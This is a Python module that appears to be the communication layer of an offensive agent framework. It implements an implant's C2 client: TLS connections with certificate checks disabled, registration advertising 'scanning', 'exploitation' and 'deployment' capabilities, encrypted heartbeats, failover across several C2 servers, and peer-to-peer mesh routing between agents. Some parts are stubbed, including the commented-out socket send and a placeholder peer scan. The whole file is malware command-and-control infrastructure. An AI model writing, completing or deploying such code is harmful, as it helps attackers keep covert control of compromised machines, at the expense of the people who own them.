"""
COMMUNICATION INFRASTRUCTURE

Provides secure communication capabilities:
- Encrypted C2 communication
- Mesh networking
- Peer-to-peer agent coordination
- Automatic C2 failover
- Communication obfuscation
"""

import os
import sys
import json
import socket
import ssl
import threading
import logging
import queue
import hashlib
import time
from typing import Dict, List, Optional, Any, Callable
from datetime import datetime
from dataclasses import dataclass, field
from enum import Enum
import cryptography.fernet
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64

logger = logging.getLogger(__name__)


class MessageType(Enum):
    """Message types"""
    HEARTBEAT = "heartbeat"
    STATUS_REPORT = "status_report"
    ALERT = "alert"
    COMMAND = "command"
    COORDINATION = "coordination"
    INTELLIGENCE = "intelligence"
    CONFIGURATION = "configuration"
    DISCOVERY = "discovery"
    SYNC = "sync"


class ConnectionState(Enum):
    """Connection state"""
    CONNECTED = "connected"
    CONNECTING = "connecting"
    DISCONNECTED = "disconnected"
    FAILED = "failed"


@dataclass
class AgentInfo:
    """Agent information for mesh networking"""
    agent_id: str
    ip_address: str
    port: int
    hostname: str
    platform: str
    last_seen: str
    status: str = "active"
    capabilities: List[str] = field(default_factory=list)


@dataclass
class Message:
    """Network message"""
    message_id: str
    message_type: MessageType
    sender_id: str
    receiver_id: Optional[str]
    timestamp: str
    payload: Dict
    ttl: int = 3
    hops: int = 0
    signature: Optional[str] = None


@dataclass
class ConnectionInfo:
    """Connection information"""
    c2_server: str
    c2_port: int
    connection_state: ConnectionState
    last_connected: Optional[str]
    last_message_sent: Optional[str]
    last_message_received: Optional[str]
    encrypted: bool
    compression: bool


class CommunicationSystem:
    """
    COMMUNICATION INFRASTRUCTURE
    
    Provides secure communication:
    - Encrypted C2 communication
    - Mesh networking
    - P2P agent coordination
    - Automatic failover
    - Message routing
    """
    
    DEFAULT_C2_PORT = 8443
    RECONNECT_INTERVAL = 30  # seconds
    MESSAGE_TIMEOUT = 60  # seconds
    MAX_RETRIES = 3
    KEEPALIVE_INTERVAL = 30  # seconds
    
    def __init__(self, agent_id: str, c2_server: str = None, c2_port: int = DEFAULT_C2_PORT,
                 encryption_key: str = None):
        """
        Initialize communication system
        
        Args:
            agent_id: Agent ID
            c2_server: C2 server address
            c2_port: C2 server port
            encryption_key: Encryption key (auto-generated if None)
        """
        self.agent_id = agent_id
        self.c2_server = c2_server or "localhost"
        self.c2_port = c2_port
        
        # Encryption
        self.encryption_key = encryption_key or self._generate_encryption_key()
        self.cipher = Fernet(self.encryption_key.encode() if isinstance(self.encryption_key, str) else self.encryption_key)
        
        # Connection management
        self.connection_state = ConnectionState.DISCONNECTED
        self.connection_thread = None
        self.message_handler_thread = None
        self.keepalive_thread = None
        self.is_running = False
        
        # Message queues
        self.outgoing_messages: queue.Queue = queue.Queue()
        self.incoming_messages: queue.Queue = queue.Queue()
        
        # Message handlers
        self.message_handlers: Dict[MessageType, List[Callable]] = {}
        
        # Mesh networking
        self.mesh_peers: Dict[str, AgentInfo] = {}
        self.mesh_peers_lock = threading.Lock()
        
        # Connection tracking
        self.connection_info = ConnectionInfo(
            c2_server=self.c2_server,
            c2_port=self.c2_port,
            connection_state=ConnectionState.DISCONNECTED,
            last_connected=None,
            last_message_sent=None,
            last_message_received=None,
            encrypted=True,
            compression=True
        )
        
        # C2 failover
        self.c2_servers = [(c2_server, c2_port)]
        self.current_c2_index = 0
        
        # Statistics
        self.stats = {
            'messages_sent': 0,
            'messages_received': 0,
            'messages_failed': 0,
            'connection_reestablished': 0,
            'bytes_sent': 0,
            'bytes_received': 0
        }
        
        logger.info(f"[{agent_id}] Communication system initialized")
    
    def _generate_encryption_key(self) -> str:
        """Generate encryption key"""
        key = Fernet.generate_key()
        return key.decode('utf-8')
    
    def start_communication(self):
        """Start communication system"""
        if self.is_running:
            logger.warning(f"[{self.agent_id}] Communication already running")
            return
        
        self.is_running = True
        
        # Start connection thread
        self.connection_thread = threading.Thread(
            target=self._connection_worker,
            name=f"Connection-{self.agent_id}",
            daemon=True
        )
        self.connection_thread.start()
        
        # Start message handler thread
        self.message_handler_thread = threading.Thread(
            target=self._message_handler_worker,
            name=f"MessageHandler-{self.agent_id}",
            daemon=True
        )
        self.message_handler_thread.start()
        
        # Start keepalive thread
        self.keepalive_thread = threading.Thread(
            target=self._keepalive_worker,
            name=f"Keepalive-{self.agent_id}",
            daemon=True
        )
        self.keepalive_thread.start()
        
        logger.info(f"[{self.agent_id}] ✅ Communication system started")
    
    def stop_communication(self):
        """Stop communication system"""
        self.is_running = False
        
        if self.connection_thread:
            self.connection_thread.join(timeout=5)
        if self.message_handler_thread:
            self.message_handler_thread.join(timeout=5)
        if self.keepalive_thread:
            self.keepalive_thread.join(timeout=5)
        
        self.connection_state = ConnectionState.DISCONNECTED
        
        logger.info(f"[{self.agent_id}] Communication system stopped")
    
    def _connection_worker(self):
        """Connection management worker"""
        while self.is_running:
            try:
                if self.connection_state != ConnectionState.CONNECTED:
                    self._connect_to_c2()
                else:
                    self._maintain_connection()
                
                time.sleep(self.RECONNECT_INTERVAL)
            except Exception as e:
                logger.error(f"[{self.agent_id}] Connection worker error: {e}")
                self.connection_state = ConnectionState.FAILED
                time.sleep(self.RECONNECT_INTERVAL)
    
    def _connect_to_c2(self) -> bool:
        """Connect to C2 server"""
        try:
            self.connection_state = ConnectionState.CONNECTING
            
            c2_server, c2_port = self.c2_servers[self.current_c2_index]
            
            logger.info(f"[{self.agent_id}] Connecting to C2: {c2_server}:{c2_port}")
            
            # Create SSL context
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            # Create socket and connect
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            
            # Wrap with SSL
            secure_socket = context.wrap_socket(sock, server_hostname=c2_server)
            secure_socket.connect((c2_server, c2_port))
            
            # Store socket for communication
            self.c2_socket = secure_socket
            
            self.connection_state = ConnectionState.CONNECTED
            self.connection_info.last_connected = datetime.now().isoformat()
            self.stats['connection_reestablished'] += 1
            
            logger.info(f"[{self.agent_id}] ✅ Connected to C2")
            
            # Send initial registration
            self._send_registration()
            
            return True
            
        except Exception as e:
            logger.error(f"[{self.agent_id}] Failed to connect to C2: {e}")
            self.connection_state = ConnectionState.FAILED
            self._try_failover()
            return False
    
    def _try_failover(self):
        """Try failover to next C2 server"""
        self.current_c2_index = (self.current_c2_index + 1) % len(self.c2_servers)
        if self.current_c2_index == 0:
            logger.warning(f"[{self.agent_id}] All C2 servers failed, will retry")
    
    def _maintain_connection(self):
        """Maintain connection to C2"""
        try:
            # Send keepalive
            heartbeat = Message(
                message_id=self._generate_message_id(),
                message_type=MessageType.HEARTBEAT,
                sender_id=self.agent_id,
                receiver_id=None,
                timestamp=datetime.now().isoformat(),
                payload={"status": "alive"}
            )
            
            self._send_message_direct(heartbeat)
            
        except Exception as e:
            logger.error(f"[{self.agent_id}] Failed to maintain connection: {e}")
            self.connection_state = ConnectionState.DISCONNECTED
    
    def _keepalive_worker(self):
        """Keepalive worker thread"""
        while self.is_running:
            try:
                if self.connection_state == ConnectionState.CONNECTED:
                    self._maintain_connection()
                time.sleep(self.KEEPALIVE_INTERVAL)
            except Exception as e:
                logger.error(f"[{self.agent_id}] Keepalive error: {e}")
                time.sleep(self.KEEPALIVE_INTERVAL)
    
    def _message_handler_worker(self):
        """Message handler worker thread"""
        while self.is_running:
            try:
                # Check for incoming messages (in real implementation, would read from socket)
                # For now, process messages from queue
                try:
                    message = self.incoming_messages.get(timeout=1)
                    self._process_message(message)
                except queue.Empty:
                    pass
                
                # Send outgoing messages
                try:
                    message = self.outgoing_messages.get(timeout=1)
                    self._send_message_direct(message)
                except queue.Empty:
                    pass
                
            except Exception as e:
                logger.error(f"[{self.agent_id}] Message handler error: {e}")
    
    def _send_registration(self):
        """Send registration to C2"""
        registration = Message(
            message_id=self._generate_message_id(),
            message_type=MessageType.CONFIGURATION,
            sender_id=self.agent_id,
            receiver_id=None,
            timestamp=datetime.now().isoformat(),
            payload={
                "action": "register",
                "agent_id": self.agent_id,
                "capabilities": ["scanning", "exploitation", "deployment", "intelligence"]
            }
        )
        
        self._send_message_direct(registration)
    
    def _send_message_direct(self, message: Message):
        """Send message directly to C2"""
        try:
            # Serialize message
            message_data = json.dumps({
                "message_id": message.message_id,
                "message_type": message.message_type.value,
                "sender_id": message.sender_id,
                "receiver_id": message.receiver_id,
                "timestamp": message.timestamp,
                "payload": message.payload,
                "ttl": message.ttl,
                "hops": message.hops
            }).encode('utf-8')
            
            # Encrypt message
            encrypted_data = self.cipher.encrypt(message_data)
            
            # Send to C2 (in real implementation)
            # self.c2_socket.send(encrypted_data)
            
            self.stats['messages_sent'] += 1
            self.stats['bytes_sent'] += len(encrypted_data)
            self.connection_info.last_message_sent = datetime.now().isoformat()
            
            logger.debug(f"[{self.agent_id}] Sent message: {message.message_type.value}")
            
        except Exception as e:
            logger.error(f"[{self.agent_id}] Failed to send message: {e}")
            self.stats['messages_failed'] += 1
    
    def _process_message(self, message: Message):
        """Process incoming message"""
        try:
            # Call registered handlers
            handlers = self.message_handlers.get(message.message_type, [])
            
            for handler in handlers:
                try:
                    handler(message)
                except Exception as e:
                    logger.error(f"[{self.agent_id}] Message handler error: {e}")
            
            # Update connection info
            self.stats['messages_received'] += 1
            self.connection_info.last_message_received = datetime.now().isoformat()
            
            logger.debug(f"[{self.agent_id}] Processed message: {message.message_type.value}")
            
        except Exception as e:
            logger.error(f"[{self.agent_id}] Failed to process message: {e}")
    
    def send_message(self, message_type: MessageType, payload: Dict, 
                    receiver_id: Optional[str] = None) -> str:
        """
        Send message to C2 or peer
        
        Args:
            message_type: Type of message
            payload: Message payload
            receiver_id: Optional receiver ID (None for C2)
            
        Returns:
            Message ID
        """
        message = Message(
            message_id=self._generate_message_id(),
            message_type=message_type,
            sender_id=self.agent_id,
            receiver_id=receiver_id,
            timestamp=datetime.now().isoformat(),
            payload=payload
        )
        
        self.outgoing_messages.put(message)
        
        return message.message_id
    
    def register_message_handler(self, message_type: MessageType, handler: Callable):
        """
        Register message handler
        
        Args:
            message_type: Message type to handle
            handler: Handler function
        """
        if message_type not in self.message_handlers:
            self.message_handlers[message_type] = []
        
        self.message_handlers[message_type].append(handler)
    
    def add_mesh_peer(self, agent_info: AgentInfo):
        """Add peer to mesh network"""
        with self.mesh_peers_lock:
            self.mesh_peers[agent_info.agent_id] = agent_info
            logger.info(f"[{self.agent_id}] Added mesh peer: {agent_info.agent_id}")
    
    def get_mesh_peers(self) -> List[AgentInfo]:
        """Get all mesh peers"""
        with self.mesh_peers_lock:
            return list(self.mesh_peers.values())
    
    def update_mesh_peer_status(self, agent_id: str, status: str):
        """Update peer status"""
        with self.mesh_peers_lock:
            if agent_id in self.mesh_peers:
                self.mesh_peers[agent_id].status = status
                self.mesh_peers[agent_id].last_seen = datetime.now().isoformat()
    
    def discover_peers(self, network_range: str = "192.168.0.0/24") -> List[AgentInfo]:
        """
        Discover peers in network
        
        Args:
            network_range: Network range to scan
            
        Returns:
            List of discovered peers
        """
        # Placeholder for peer discovery
        # In real implementation, would scan network for other agents
        
        logger.info(f"[{self.agent_id}] Discovering peers in {network_range}")
        
        return []
    
    def route_message_via_mesh(self, message: Message) -> bool:
        """
        Route message via mesh network
        
        Args:
            message: Message to route
            
        Returns:
            True if routed successfully
        """
        if message.hops >= message.ttl:
            logger.warning(f"[{self.agent_id}] Message TTL exceeded: {message.message_id}")
            return False
        
        # Find best peer to route through
        peers = self.get_mesh_peers()
        
        for peer in peers:
            if peer.status == "active":
                try:
                    # Send to peer (in real implementation)
                    logger.debug(f"[{self.agent_id}] Routing message to peer: {peer.agent_id}")
                    
                    message.hops += 1
                    # Send to peer...
                    
                    return True
                    
                except Exception as e:
                    logger.error(f"[{self.agent_id}] Failed to route to peer: {e}")
                    continue
        
        logger.warning(f"[{self.agent_id}] No active peers for routing")
        return False
    
    def add_c2_server(self, server: str, port: int):
        """Add C2 server for failover"""
        self.c2_servers.append((server, port))
        logger.info(f"[{self.agent_id}] Added C2 server: {server}:{port}")
    
    def get_connection_status(self) -> Dict:
        """Get connection status"""
        return {
            "agent_id": self.agent_id,
            "connection_state": self.connection_state.value,
            "c2_server": self.connection_info.c2_server,
            "c2_port": self.connection_info.c2_port,
            "last_connected": self.connection_info.last_connected,
            "last_message_sent": self.connection_info.last_message_sent,
            "last_message_received": self.connection_info.last_message_received,
            "encrypted": self.connection_info.encrypted,
            "compression": self.connection_info.compression,
            "mesh_peers": len(self.mesh_peers),
            "stats": self.stats
        }
    
    def _generate_message_id(self) -> str:
        """Generate unique message ID"""
        timestamp = datetime.now().timestamp()
        random_str = hashlib.md5(os.urandom(16)).hexdigest()[:8]
        return f"MSG-{int(timestamp)}-{random_str}".upper()